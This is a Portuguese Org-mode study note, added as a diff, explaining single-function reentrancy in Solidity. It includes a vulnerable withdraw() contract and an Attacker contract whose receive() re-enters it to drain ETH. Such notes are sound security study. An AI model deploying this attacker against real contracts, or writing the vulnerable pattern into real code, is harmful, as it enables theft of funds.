@@ -1,0 +1,53 @@
+:PROPERTIES:
+:ID:       6a5baf8e-8c6b-44b5-87ae-64d1191e2fde
+:END:
+#+title: Reentrada de Função Única (Solidity)
+#+date: 2023-09-07
+#+filetags: reentrancy
+
+- tags :: [[id:410e9489-9d48-44a3-8125-abf61a8df4c8][Reentrada (SWC-107)]]
+- source :: [[https://scsfg.io/hackers/reentrancy/#single-function-reentrancy][Single-Function Reentrancy (SCSFG)]]
+
+É o tipo de reentrada que afeta o contexto de uma única função.
+
+* Vulnerabilidade
+No código abaixo, a função de saque irá pegar o saldo disponível do chamador da função e transferir para ele esse valor caso o contrato tenha ETH suficiente para isso. Se a transferência foi bem-sucedida, ele irá atualizar o saldo disponível do chamador da função.
+
+ O problema com esse código é: se o chamador da função for um contrato, ele poderá usar ~receive()~ para reentrar a função ~withdraw()~ do contrato antes que ela termine de executar e sacar mais até secar o ETH do contrato. Isso é possível porque o saldo disponível é atualizado só depois da transferência.
+
+ #+begin_src solidity
+ contract Vulnerable {
+     mapping(address => uint256) public balances;
+
+     function withdraw() public {
+         uint256 amount = balances[msg.sender];
+         (bool success, ) = msg.sender.call{value: amount}("");
+         require(success);
+         balances[msg.sender] = 0;
+     }
+ }
+ #+end_src
+
+* Exploitando
+#+begin_src solidity
+contract Attacker {
+    Vulnerable public vulnerableContract;
+    uint256 public reentranceCount;
+
+    constructor(address vulnerableContractAddress) {
+	vulnerableContract = Vulnerable(vulnerableContractAddress);
+    }
+
+    function attack() public {
+	reentranceCount = 0;
+	vulnerableContract.withdraw();
+    }
+
+    receive() external payable {
+	if (reentranceCount < 5) {
+	    vulnerableContract.withdraw();
+	    reentranceCount++;
+	}
+    }
+}
+#+end_src
